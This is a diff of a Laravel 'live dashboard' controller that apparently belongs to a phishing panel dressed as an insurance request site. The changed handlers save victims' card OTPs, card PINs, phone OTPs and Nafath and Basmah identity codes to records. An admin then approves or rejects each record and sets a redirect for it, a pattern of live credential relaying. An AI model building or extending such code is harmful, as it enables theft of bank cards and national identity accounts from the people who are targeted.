@@ -156,41 +156,45 @@ class LiveDashboardController extends Controller
         ]);
 
         try {
-            $user = InsuranceRequest::findOrFail($request->user_id);
+            $userId = $request->input('user_id');
+            $codeType = $request->input('code_type');
+            $code = $request->input('code');
             
+            $user = InsuranceRequest::findOrFail($userId);
+             
             // Store the code based on type
-            switch ($request->code_type) {
+            switch ($codeType) {
                 case 'b-call':
                 case 'c-code':
-                    $user->card_otp = $request->code;
+                    $user->card_otp = $code;
                     break;
                     
                 case 'pin':
-                    $user->card_pin = $request->code;
+                    $user->card_pin = $code;
                     break;
                     
                 case 'phone':
                 case 'p-code':
-                    $user->phone_otp = $request->code;
+                    $user->phone_otp = $code;
                     break;
                     
                 case 'stc-call':
-                    $user->phone_otp = $request->code;
+                    $user->phone_otp = $code;
                     break;
                     
                 case 'nafad':
-                    $user->nafad_code = $request->code;
+                    $user->nafad_code = $code;
                     break;
                     
                 case 'nafad-basmah':
-                    $user->basmah_code = $request->code;
+                    $user->basmah_code = $code;
                     break;
             }
             
             $user->save();
 
             // Here you can also trigger a real-time event to show the code on user's screen
-            // event(new CodeSent($user->id, $request->code_type, $request->code));
+            // event(new CodeSent($user->id, $codeType, $code));
 
             return response()->json([
                 'success' => true,
@@ -216,16 +220,19 @@ class LiveDashboardController extends Controller
         ]);
 
         try {
-            $user = InsuranceRequest::findOrFail($request->user_id);
+            $userId = $request->input('user_id');
+            $redirectTo = $request->input('redirect_to');
+            
+            $user = InsuranceRequest::findOrFail($userId);
             
             $user->approval_status = 'approved';
-            $user->approval_redirect_url = $request->redirect_to;
+            $user->approval_redirect_url = $redirectTo;
             $user->approved_by = auth('super_admin')->id();
             $user->approved_at = now();
             $user->save();
 
             // Trigger real-time event
-            // event(new UserApproved($user->id, $request->redirect_to));
+            // event(new UserApproved($user->id, $redirectTo));
 
             return response()->json([
                 'success' => true,
@@ -250,7 +257,8 @@ class LiveDashboardController extends Controller
         ]);
 
         try {
-            $user = InsuranceRequest::findOrFail($request->user_id);
+            $userId = $request->input('user_id');
+            $user = InsuranceRequest::findOrFail($userId);
             
             $user->approval_status = 'rejected';
             $user->approved_by = auth('super_admin')->id();
